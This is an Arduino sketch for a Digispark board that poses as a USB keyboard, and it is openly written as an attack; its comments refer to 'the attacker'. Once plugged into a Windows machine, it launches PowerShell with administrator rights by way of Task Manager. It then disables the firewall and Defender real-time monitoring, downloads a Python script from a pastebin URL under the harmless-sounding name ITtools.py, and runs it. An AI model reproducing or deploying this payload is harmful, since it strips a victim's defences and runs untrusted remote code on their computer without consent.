#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() { 
  
  // Define LED on the board.
  pinMode(1, OUTPUT);
  
  // Setup information.
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Command Chain- Starts powershell as ADMIN.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr"); // Starting Taskmgr
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N); // Run
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Turns on ADMIN privledges.
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  // Kill TASKMGR
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(5000);

  // Turn OFF the firewall.
  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Turn OFF Defender Antivirus.
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  
  // Upload and run shell script.
  DigiKeyboard.println("$URL = \"https://pastebin.com/raw/m7gbhi2W\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("$PATH = \"C:/ITtools.py\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Invoke-WebRequest -URI $URL -OutFile $Path");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("python /ITtools.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  // Turn ON the LED letting the attacker know that the program is complete.
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

}
void loop() {}